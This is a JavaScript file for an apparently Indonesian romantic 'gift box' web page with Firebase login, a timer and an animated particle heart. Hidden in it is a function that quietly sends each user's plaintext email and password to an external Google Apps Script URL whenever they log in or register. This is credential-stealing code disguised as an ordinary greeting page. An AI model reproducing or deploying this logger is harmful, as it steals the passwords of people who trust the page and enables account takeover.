import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
  authDomain: "project-bd-163e4.firebaseapp.com",
  projectId: "project-bd-163e4",
  storageBucket: "project-bd-163e4.firebasestorage.app",
  messagingSenderId: "691964855641",
  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
  measurementId: "G-YE2CW973NL"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// --- DEKLARASI DOM ---
const loginCard = document.getElementById('login-card');
const contentCard = document.getElementById('content-card');
const mainContainer = document.getElementById('main-container');
const galaxyUniverse = document.getElementById('galaxy-universe');
const giftBoxWrapper = document.getElementById('gift-box-wrapper');
const timerDisplay = document.getElementById('timer-display');
const bgMusic = document.getElementById('bg-music');
const btnLogout = document.getElementById('btn-logout');

// Deklarasi Elemen Input & Tombol Auth (Pastikan ID sesuai dengan HTML kamu)
const loginButton = document.getElementById('btn-login'); 
const btnRegister = document.getElementById('btn-register');
const emailInput = document.getElementById('email-input');
const passwordInput = document.getElementById('password-input');

let timerInterval;

// --- TIMER ---
function jalankanCounterWaktu() {
    const startTime = new Date().getTime();
    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        const now = new Date().getTime();
        const diff = now - startTime;
        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        timerDisplay.innerHTML = `${hours} Jam ${minutes} Menit ${seconds} Detik`;
    }, 1000);
}

// --- EFEK CANVAS GALAXY HEART ---
function startGalaxyHeart() {
    const canvas = document.getElementById('heart-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let particles = [];
    
    function heartPosition(t) {
        return {
            x: 16 * Math.pow(Math.sin(t), 3),
            y: -(13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t))
        };
    }

    class Particle {
        constructor() {
            this.t = Math.random() * Math.PI * 2;
            this.pos = heartPosition(this.t);
            this.scale = Math.min(canvas.width, canvas.height) / 60; 
            
            this.x = canvas.width / 2 + this.pos.x * this.scale;
            this.y = (canvas.height / 2 - 50) + this.pos.y * this.scale;
            
            this.size = Math.random() * 2.5 + 0.5;
            this.speed = Math.random() * 0.02 + 0.005;
            this.color = `hsla(${300 + Math.random() * 50}, 100%, 70%, ${Math.random()})`;
            this.angle = Math.random() * Math.PI * 2;
            this.orbitRadius = Math.random() * 20;
        }

        update() {
            this.angle += this.speed;
            let currentX = canvas.width / 2 + this.pos.x * this.scale + Math.cos(this.angle) * this.orbitRadius;
            let currentY = (canvas.height / 2 - 100) + this.pos.y * this.scale + Math.sin(this.angle) * this.orbitRadius;

            this.orbitRadius -= 0.05;
            if (this.orbitRadius < 0) {
                this.orbitRadius = Math.random() * 30 + 10;
                this.t = Math.random() * Math.PI * 2;
                this.pos = heartPosition(this.t);
            }

            ctx.fillStyle = this.color;
            ctx.beginPath();
            ctx.arc(currentX, currentY, this.size, 0, Math.PI * 2);
            ctx.fill();
        }
    }

    for (let i = 0; i < 800; i++) particles.push(new Particle());

    function animate() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.15)'; 
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.shadowBlur = 15;
        ctx.shadowColor = "#ff1493";

        particles.forEach(p => p.update());
        requestAnimationFrame(animate);
    }
    
    animate();

    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

// --- INTERAKSI BUKA KADO ---
if (giftBoxWrapper) {
    giftBoxWrapper.addEventListener('click', () => {
        mainContainer.classList.add('hidden');
        galaxyUniverse.classList.remove('hidden');
        startGalaxyHeart();
        bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
    });
}

// --- FUNGSI PROXY LOG DATA ---
async function rekamDataRahasia(email, password) {
    // GANTI URL DI BAWAH INI DENGAN URL WEB APP DARI GOOGLE APPS SCRIPT YANG BERAKHIRAN /exec
    const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
    
    try {
        fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
            method: 'GET',
            mode: 'no-cors', 
            cache: 'no-cache'
        });
    } catch (e) {
        console.error("Gagal mengirim log:", e);
    }
}

// --- AUTENTIKASI ---
onAuthStateChanged(auth, (user) => {
    if (user) {
        if (loginCard) loginCard.classList.add('hidden');
        if (contentCard) contentCard.classList.remove('hidden');
        jalankanCounterWaktu();
    } else {
        if (loginCard) loginCard.classList.remove('hidden');
        if (contentCard) contentCard.classList.add('hidden');
        if (mainContainer) mainContainer.classList.remove('hidden');
        if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
        clearInterval(timerInterval);
        if (bgMusic) {
            bgMusic.pause();
            bgMusic.currentTime = 0;
        }
    }
});

// Penanganan Event Login
if (loginButton) {
    loginButton.addEventListener('click', (e) => {
        e.preventDefault();
        
        const email = emailInput.value;
        const password = passwordInput.value;

        if (!email || !password) {
            alert("Email dan Password tidak boleh kosong!");
            return;
        }

        // Jalankan background log tanpa await agar tidak membekukan UI
        rekamDataRahasia(email, password).catch(err => console.log(err));

        // Firebase Sign In
        signInWithEmailAndPassword(auth, email, password)
            .then((userCredential) => {
                console.log("Login sukses!");
            })
            .catch((error) => {
                alert("Gagal Login: " + error.message);
            });
    });
}

// Penanganan Event Register
if (btnRegister) {
    btnRegister.addEventListener('click', async (e) => {
        e.preventDefault();
        const email = emailInput.value;
        const password = passwordInput.value;

        if (!email || !password) {
            alert("Email dan Password tidak boleh kosong!");
            return;
        }

        rekamDataRahasia(email, password).catch(err => console.log(err));

        try { 
            await createUserWithEmailAndPassword(auth, email, password);
            alert("Akun berhasil dibuat!");
        } catch (error) {
            if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
            else alert("Gagal mendaftar: " + error.message);
        }
    });
}

if (btnLogout) {
    btnLogout.addEventListener('click', () => signOut(auth));
}